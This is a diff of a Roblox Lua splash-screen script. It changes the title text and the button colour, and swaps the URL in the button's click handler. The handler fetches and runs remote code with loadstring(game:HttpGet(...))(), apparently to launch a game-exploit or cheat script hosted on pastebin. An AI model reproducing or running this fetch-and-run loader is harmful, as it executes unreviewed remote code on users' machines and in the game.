@@ -21,7 +21,7 @@ uiCorner.Parent = frame
 title.Size = UDim2.new(1, 0, 0.2, 0)
 title.Position = UDim2.new(0, 0, 0.1, 0)
 title.BackgroundTransparency = 1
-title.Text = "Vamp"
+title.Text = "L0C0N"
 title.TextColor3 = Color3.fromRGB(255, 255, 255)
 title.TextScaled = true
 title.Font = Enum.Font.GrenzeGotisch
@@ -40,7 +40,7 @@ description.Parent = frame
 
 button.Size = UDim2.new(0.6, 0, 0.2, 0)
 button.Position = UDim2.new(0.2, 0, 0.7, 0)
-button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+button.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
 button.Text = "Start"
 button.TextColor3 = Color3.fromRGB(255, 255, 255)
 button.TextScaled = true
@@ -61,7 +61,7 @@ button.MouseButton1Click:Connect(function()
         wait(0.05)
     end
     screenGui:Destroy()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/noGlxcka/lua/main/Protected_1366052659630308.lua.txt"))()
+    loadstring(game:HttpGet("https://pastebin.com/raw/QiV0rQpA"))()
 end)
 
 for i = 1, 0, -0.1 do
